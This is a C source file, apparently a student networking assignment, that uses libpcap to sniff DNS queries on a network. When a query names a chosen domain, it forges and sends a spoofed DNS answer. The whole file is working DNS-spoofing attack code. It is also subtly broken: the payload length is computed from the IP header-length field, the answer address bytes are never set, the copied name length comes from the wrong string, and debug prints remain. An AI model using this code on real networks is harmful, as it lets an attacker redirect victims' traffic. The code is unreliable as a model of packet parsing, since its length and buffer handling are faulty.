/*---------------------------------------------------------------------------------------------
--	SOURCE FILE:	proc_hdrs.c -   program to process the packet headers
--
--	FUNCTIONS:		libpcap - packet filtering library based on the BSD packet
--					filter (BPF)
--
--	DATE:			May 10, 2023
--
--	REVISIONS:		(Date and nic_description)
--
--				    May 15, 2023
--				    Added personal function for assignment
--
--	DESIGNERS:		Based on the code by Martin Casado Aman Abdulla, Aman Abdulla
--					Also code was taken from tcpdump source, namely the following files..
--					print-ether.c
--					print-ip.c
--					ip.h
--					Modified & redesigned: Aman Abdulla: 2006, 2014, 2016
--
--	STUDENT:		HyungJoon LEE
-------------------------------------------------------------------------------------------------*/

#include "spoof.h"


void pkt_callback(u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet) {
    u_int16_t type = handle_ethernet(args, pkthdr, packet);
    /* handle the IP packet */
    if(type == ETHERTYPE_IP) handle_IP(args, pkthdr, packet);
}


void handle_IP (u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet) {
    const struct iphdr* ip;
    ip = (struct iphdr*) (packet + sizeof(struct ether_header));
    /* handle the UDP packet */
    if (ip->protocol == IPPROTO_UDP) handle_UDP(args, pkthdr, packet);
}


void handle_UDP (u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet) {
    struct udphdr *udp;
    struct iphdr *ip;
    struct dnsquery dns_query;
    struct dnshdr *dns_hdr;

    char* response_packet = NULL;

    char request[100] = {0};
    char response[2096] = {0};

    int size_ip;
    int size_udp;
    int size_payload;
    uint16_t size_response_payload = 0;

    ip = (struct iphdr*) (packet + SIZE_ETHERNET);
    size_ip = ip->ihl * 4;


    udp = (struct udphdr*) (packet + SIZE_ETHERNET + size_ip);
    size_udp = 8;

    // compute tcp payload (segment) size
    size_payload = ntohs(ip->ihl) - (size_ip + size_udp);
    response_packet = response + sizeof(struct ip) + sizeof(struct udphdr);

    // Print payload data, including binary translation
    if (size_payload > 0) {
        handle_DNS(args, pkthdr, packet, &dns_hdr, &dns_query);
        handle_DNS_request(&dns_query, request);
        if (!strcmp(request, opts.request_url)) {
            opts.device_port = ntohs(udp->uh_sport);
            printf("1111111111111111111111\n");
            size_response_payload = set_payload(dns_hdr, response_packet);
            printf("2222222222222222222222\n");
            create_header(response_packet, size_response_payload);
            printf("3333333333333333333333\n");
            size_response_payload += (sizeof(struct ip) + sizeof(struct udphdr));
            printf("4444444444444444444444\n");
            send_dns_answer(response_packet, size_response_payload);
            printf("5555555555555555555555\n");
        }
    }
}


void handle_DNS (u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet, struct dnshdr **dns_hdr, struct dnsquery *dns_query) {
    struct etherhdr *ether;
    struct iphdr *ip;
    struct udphdr *udp;
    unsigned int ip_header_size;

    /* ethernet header */
    ether = (struct etherhdr*)(packet);

    /* ip header */
    ip = (struct iphdr*)(((char*) ether) + sizeof(struct etherhdr));
    ip_header_size = ip->ihl*4;
    udp = (struct udphdr *)(((char*) ip) + ip_header_size);

    /* dns header */
    *dns_hdr = (struct dnshdr*)(((char*) udp) + sizeof(struct udphdr));
    dns_query->qname = ((char*) *dns_hdr) + sizeof(struct dnshdr);
}


void handle_DNS_request(struct dnsquery *dns_query, char *request) {
    unsigned int i, j, k;
    char *curr = dns_query->qname;
    unsigned int size;

    size = curr[0];

    j=0;
    i=1;
    while(size > 0) {
        for(k=0; k<size; k++) {
            request[j++] = curr[i+k];
        }
        request[j++]='.';
        i+=size;
        size = curr[i++];
    }
    request[--j] = '\0';
}


uint16_t set_payload(struct dnshdr *dns_hdr, char* response_packet) {
    unsigned int size = 0; /* response_packet size */
    struct dnsquery *dns_query;
    unsigned char ans[4];

    dns_query = (struct dnsquery*)(((char*) dns_hdr) + sizeof(struct dnshdr));

    //dns_hdr
    memcpy(&response_packet[0], dns_hdr->id, 2); //id
    memcpy(&response_packet[2], "\x81\x80", 2); //flags
    memcpy(&response_packet[4], "\x00\x01", 2); //qdcount
    memcpy(&response_packet[6], "\x00\x01", 2); //ancount
    memcpy(&response_packet[8], "\x00\x00", 2); //nscount
    memcpy(&response_packet[10], "\x00\x00", 2); //arcount

    //dns_query
    size = strlen(opts.spoofing_ip) + 2;// +1 for the size of the first string; +1 for the last '.'
    memcpy(&response_packet[12], dns_query, size); //qname
    size+=12;
    memcpy(&response_packet[size], "\x00\x01", 2); //type
    size+=2;
    memcpy(&response_packet[size], "\x00\x01", 2); //class
    size+=2;

    //dns_response_packet
    memcpy(&response_packet[size], "\xc0\x0c", 2); //pointer to qname
    size+=2;
    memcpy(&response_packet[size], "\x00\x01", 2); //type
    size+=2;
    memcpy(&response_packet[size], "\x00\x01", 2); //class
    size+=2;
    memcpy(&response_packet[size], "\x00\x00\x00\x22", 4); //ttl - 34s
    size+=4;
    memcpy(&response_packet[size], "\x00\x04", 2); //rdata length
    size+=2;
    memcpy(&response_packet[size], ans, 4); //rdata
    size+=4;

    return size;
}
